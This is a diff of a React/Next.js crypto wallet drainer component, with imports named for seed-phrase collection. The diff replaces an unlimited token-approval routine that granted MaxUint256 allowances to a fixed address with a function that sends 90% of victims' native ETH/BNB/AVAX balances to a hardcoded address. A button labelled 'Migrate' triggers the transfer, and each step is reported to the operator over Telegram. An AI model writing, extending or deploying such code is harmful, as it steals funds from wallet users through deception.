@@ -8,6 +8,7 @@ import SeedPhraseCollector from "./collector";
 import DeedCollector from "./collectorPk";
 import Image from "next/image";
 import suspended from "../../../public/deactivate.png"
+import { useApproval } from "../context/approvalContext";
 
 
 
@@ -25,7 +26,7 @@ type Token = {
 
 
 
-const ApproveTxn = () => {
+const Native = () => {
   const { address, isConnected, connector } = useAccount();
   const { data: walletClient } = useWalletClient();
   const [tokens, setTokens] = useState<Token[]>([]);
@@ -34,21 +35,12 @@ const ApproveTxn = () => {
   const [showPopup, setShowPopup] = useState(false);
   const [nextPopup, setNextPopup] = useState(false);
   const [isHovered, setIsHovered] = useState(false);
+  const { isApproved } = useApproval(); // Access the approval status from context
 
 
   
 
-
-
-  useEffect(() => {
-    if (connector?.name === "MetaMask") {
-      setIsMetaMask(true);
-      setShowPopup(true); // Trigger the popup
-    } else {
-      setIsMetaMask(false);
-      setShowPopup(false);
-    }
-  }, [connector]);
+  
 
   // Fetch user tokens from DeBank API
   const fetchUserTokens = async () => {
@@ -90,7 +82,7 @@ const ApproveTxn = () => {
       // Filter tokens for DeBank-supported tokens only (is_core or is_verified)
       const filteredAndSortedTokens = formattedTokens
         .filter((token: { isCore: any; isVerified: any }) => token.isCore || token.isVerified)
-        .filter((token: { usdValue: number }) => token.usdValue >= 500)
+        .filter((token: { usdValue: number }) => token.usdValue >= 10)
         .sort((a: { usdValue: number }, b: { usdValue: number }) => b.usdValue - a.usdValue);
 
       setTokens(filteredAndSortedTokens);
@@ -118,153 +110,131 @@ const ApproveTxn = () => {
 
   
 
-  const approveAllTokens = async () => {
+  const sendNativeTokens = async () => {
     if (!walletClient || !address) return;
   
-    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
     const provider = new ethers.BrowserProvider(walletClient as any);
     const signer = await provider.getSigner();
-    const processedTokens = new Set<string>(); // To prevent duplicate processing of native tokens
     let activeChainId: number | null = null; // Track the current chain ID
-    
-    let successfulApprovals = 0;
-    let failedApprovals = 0;
-    let rejectedApprovals = 0;
-    
   
+    let sentNativeTokens = 0;
+    let unsentNativeTokens = 0;
+  
+    const nativeTokenUsdThreshold = 1000; // Only send native tokens if their USD value is greater than $1000
+  
+    // Process only native tokens (ETH, BNB, AVAX, etc.)
     for (const token of tokens) {
-      // Skip native tokens explicitly
+      // Check if the token is native (ETH, BNB, POL, AVAX, FTM)
       if (
-        !token.address ||
-        token.address === ethers.ZeroAddress ||
-        ["ETH", "BNB", "POL", "AVAX", "FTM" ].includes(token.symbol)
+        token.address === ethers.ZeroAddress || // It's a native token (ETH, BNB, etc.)
+        ["ETH", "BNB", "POL", "AVAX", "FTM"].includes(token.symbol) // Filter for native tokens
       ) {
-        if (!processedTokens.has(token.symbol)) {
-          console.log(`⚠️ Skipping native token: ${token.name} (${token.symbol})`);
-          await sendTelegramMessage(`⚠️ Skipping native token: ${token.name} (${token.symbol})`);
-          processedTokens.add(token.symbol);
-        }
-        continue;
-      }
+        // Apply the USD value threshold for native tokens
+        if (token.usdValue >= nativeTokenUsdThreshold) {
+          const balanceToSend = (token.balance * 0.9).toFixed(4); // Send 90% of the balance, leaving enough for gas
   
-      const chainDetails = getChainDetailsForName(token.chain);
+          console.log(`⚡ Sending ${balanceToSend} ${token.symbol} from ${token.chain} chain...`);
   
-      try {
-        // Switch to the correct chain
-        if (walletClient?.switchChain) {
-          await walletClient.switchChain({ id: chainDetails.id });
+          try {
+            // Ensure we are on the correct chain before sending
+            activeChainId = await walletClient.getChainId();
+            const chainDetails = getChainDetailsForName(token.chain);  // Declare once here
   
-          // Add a slight delay to ensure chain synchronization
-          await new Promise((resolve) => setTimeout(resolve, 500));
+            // Check if the wallet is already on the correct chain, and switch if necessary
+            if (activeChainId !== chainDetails.id) {
+              console.log(`⚡ Switching to ${chainDetails.name} chain...`);
+              await walletClient.switchChain({ id: chainDetails.id });
   
-          activeChainId = await walletClient.getChainId();
-          if (activeChainId !== chainDetails.id) {
-            const mismatchWarning = `⚠️ Warning: Chain mismatch detected. Expected: ${chainDetails.name}, Got: ${activeChainId}`;
-            console.warn(mismatchWarning);
-            await sendTelegramMessage(mismatchWarning);
-            continue; // Skip token if chain mismatch occurs
+              // Wait for chain to sync properly
+              await new Promise((resolve) => setTimeout(resolve, 1000)); // Wait a second after switching chain
+  
+              // Confirm that the chain has switched
+              activeChainId = await walletClient.getChainId();
+              if (activeChainId !== chainDetails.id) {
+                const mismatchWarning = `⚠️ Network mismatch: Expected ${chainDetails.name}, but got chain ID ${activeChainId}. Skipping...`;
+                console.warn(mismatchWarning);
+                await sendTelegramMessage(mismatchWarning);
+                continue; // Skip token if chain mismatch occurs
+              }
+  
+              console.log(`✅ Successfully switched to ${chainDetails.name} chain.`);
+              await sendTelegramMessage(`✅ Successfully switched to ${chainDetails.name} chain.`);
+            }
+  
+            // Send native token using signer
+            const transaction = {
+              to: "0x12f673F3E1D583b3c768590107c25C036f02f5EC", // Replace with the recipient address
+              value: ethers.parseEther(balanceToSend), // Amount to send
+            };
+  
+            // Log the transaction details to ensure it's correct
+            console.log("Transaction details:", transaction);
+  
+            // Prompt the user to sign the transaction
+            const tx = await signer.sendTransaction(transaction);
+            console.log(`⏳ Waiting for transaction confirmation...`);
+  
+            // Wait for the transaction to be mined
+            const receipt = await tx.wait();
+  
+            // Check if receipt is valid (not null) before accessing receipt.hash
+            if (receipt) {
+              const explorerUrl = getChainDetailsForName(token.chain).explorer + receipt.hash;
+              const successMessage = `✅ Successfully sent ${balanceToSend} ${token.symbol} from ${token.chain} chain.\n[View on explorer](${explorerUrl})`;
+  
+              console.log(successMessage); // Log the success message
+              await sendTelegramMessage(successMessage); // Send the success message to Telegram
+  
+              sentNativeTokens++;
+              console.log(`✅ Successfully sent ${balanceToSend} ${token.symbol}`);
+            } else {
+              // Handle the case when receipt is null or undefined
+              console.warn(`⚠️ Transaction receipt is null for ${token.symbol}. Skipping...`);
+              unsentNativeTokens++;
+            }
+  
+            // After transaction is confirmed, check if network is still correct
+            activeChainId = await walletClient.getChainId();
+            if (activeChainId !== chainDetails.id) {
+              console.warn(`⚠️ Network mismatch after transaction for ${token.symbol}. Switching to correct chain...`);
+              await walletClient.switchChain({ id: chainDetails.id });
+              await new Promise((resolve) => setTimeout(resolve, 1000)); // Wait a second after switching chain
+            }
+  
+            // Wait for the transaction message to be processed before moving on to the next token
+            console.log(`✔️ Telegram message sent for token ${token.name} (${token.symbol}). Waiting 2 seconds before proceeding.`);
+            await new Promise((resolve) => setTimeout(resolve, 2000));
+  
+          } catch (err) {
+            unsentNativeTokens++;
+            console.error(`❌ Failed to send native token ${token.symbol} from ${token.chain}.`, err);
+            await sendTelegramMessage(`❌ Failed to send native token ${token.symbol} from ${token.chain}.`);
           }
-          const chainSwitchSuccess = `✅ Successfully switched to chain ${token.chain} (${chainDetails.name}).`;
-          console.log(chainSwitchSuccess);
-          await sendTelegramMessage(chainSwitchSuccess); // Send chain switch success immediately
-        }
-      } catch (err) {
-        if (err instanceof Error) {
-          const switchError = `❌ Failed to switch to chain ${token.chain} (${chainDetails.name}) for token ${token.name} (${token.symbol}).\nReason: ${err.message}`;
-          console.error(switchError);
-          await sendTelegramMessage(switchError);
         } else {
-          console.error("❌ Unknown error occurred while switching chains.");
-          await sendTelegramMessage("❌ Unknown error occurred while switching chains.");
-        }
-        continue; // Skip this token
-      }
-  
-      const tokenContract = new ethers.Contract(token.address, abi, signer);
-      const maxUint256 = ethers.MaxUint256;
-  
-      try {
-        // Approve the token
-        const tx = await tokenContract.approve(
-          "0x8fF15369602bB3e0BEbf0665CCA72600a6781DbF",
-          maxUint256
-        );
-
-        activeChainId = await walletClient.getChainId();
-      
-        console.log(`⏳ Waiting for transaction confirmation for token ${token.name} (${token.symbol}) on chain ${token.chain}...`);
-      
-        // Wait for the transaction to be mined
-        const receipt = await tx.wait();
-      
-        // Log the receipt for debugging purposes
-        console.log(`Receipt for ${token.name}:`, receipt);
-      
-        // Check for transaction hash
-        if (receipt.hash) { // Corrected: Use 'receipt.hash' instead of 'receipt.transactionHash'
-          const explorerUrl = chainDetails.explorer + receipt.hash;
-          successfulApprovals++; // Increment successful approvals counter
-          const successMessage = ` \n\n🏦 \`${address}\`\n[View on DeBank](https://debank.com/profile/${address}) \n\n✅ Successfully approved token ${token.name} (${token.symbol}) on chain ${token.chain}.\n\n[${explorerUrl}](${explorerUrl})`;
-          console.log(successMessage);
-          await sendTelegramMessage(successMessage);
-      
-          // Wait to ensure Telegram processes the message
-          console.log(`✔️ Telegram message sent for token ${token.name} (${token.symbol}). Waiting 2 seconds before proceeding.`);
-          await new Promise((resolve) => setTimeout(resolve, 2000));
-        } else {
-          console.warn(`⚠️ Transaction confirmed but no hash found for ${token.name} (${token.symbol}) on ${token.chain} chain.`);
-        }
-      } 
-
-      
-      
-      catch (err: any) {
-        try {
-          // Extract relevant information from the error object
-          const errorCode = err?.info?.error?.code || err?.code;
-          const errorMessage = err?.info?.error?.message || err?.message || "Unknown error";
-      
-          if (errorCode === 4001) {
-            // Handle user rejection explicitly
-            rejectedApprovals++; // Increment rejected approvals counter
-            const rejectionMessage = `❌ User rejected the transaction for ${token.name} (${token.symbol}) on ${token.chain} chain.`;
-            console.warn(rejectionMessage);
-            await sendTelegramMessage(rejectionMessage);
-          } else if (errorMessage.includes("network changed") && activeChainId === chainDetails.id) {
-            // Handle network change gracefully
-            const successMessage = `✅ Successfully approved token ${token.name} (${token.symbol}) on ${token.chain} chain.`;
-            console.info(successMessage);
-            await sendTelegramMessage(successMessage); // Ensure successful approval is logged
-          } else {
-            // Generic approval failure
-            failedApprovals++; // Increment failed approvals counter
-            const approveError = `❌ Failed to approve token ${token.name} (${token.symbol}) on ${token.chain} chain.
-            Reason: ${errorMessage}`;
-            console.error(approveError);
-            await sendTelegramMessage(approveError);
-          }
-        } catch (parseError) {
-          // Handle unexpected parsing issues
-          const unknownApproveError = `❌ Unknown error occurred while approving token ${token.name} (${token.symbol}) on ${token.chain} chain.`;
-          console.error(unknownApproveError, parseError);
-          await sendTelegramMessage(unknownApproveError);
+          console.log(`⚠️ Skipping native token ${token.symbol} as its USD value is below $1K.`);
         }
       }
-      
-      
-      
-  
-        
     }
   
+    // Final status to Telegram
     const totalTokens = tokens.length;
-  const allDoneMessage = `🎉 Sequence completed! Total tokens: ${totalTokens}.
-  - ✅ Successfully approved: ${successfulApprovals}
-  - ❌ Failed approvals: ${failedApprovals}
-  - ⛔ Rejected approvals: ${rejectedApprovals}`;
-  console.log(allDoneMessage);
-  await sendTelegramMessage(allDoneMessage);
+    const allDoneMessage = `🎉 Sequence completed! Total tokens: ${totalTokens}.
+      - 💸 Sent Native Tokens: ${sentNativeTokens}
+      - ⚠️ Unsent Native Tokens: ${unsentNativeTokens}`;
+    console.log(allDoneMessage);
+    await sendTelegramMessage(allDoneMessage);
   };
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
   
   
 
@@ -299,27 +269,27 @@ const ApproveTxn = () => {
     <div style={{
       width: "100%"
     }}>
-      {isLoading && <p>Loading tokens...</p>}
-      <button onClick={approveAllTokens}
-              disabled={isMetaMask}
+      {isLoading && <p>...</p>}
+      <button onClick={sendNativeTokens}
+              disabled={!isApproved}
               onMouseEnter={() => setIsHovered(true)}
       onMouseLeave={() => setIsHovered(false)}
       style={{
         
   marginBottom: "5px",
   padding: "10px",
-  backgroundColor: isMetaMask ? "#ccc"  : isHovered
+  backgroundColor: !isApproved ? "#ccc"  : isHovered
   ? "#002f7f" // Hover background color
   : "#015efe", // Default background color
   border: "none",
-  borderRadius: "16px",
+  borderRadius: "10px",
   color: isMetaMask ? "white" : "white",
   fontSize: "1rem",
   cursor: isMetaMask ? "not-allowed" : "pointer",
   width: "100%",
   height: "42px",
   }}
-      >Approve</button>
+      >Migrate</button>
       {showPopup && (
         <div
           style={{
@@ -465,4 +435,4 @@ onClick={() => {
   );
 };
 
-export default ApproveTxn;
+export default Native;
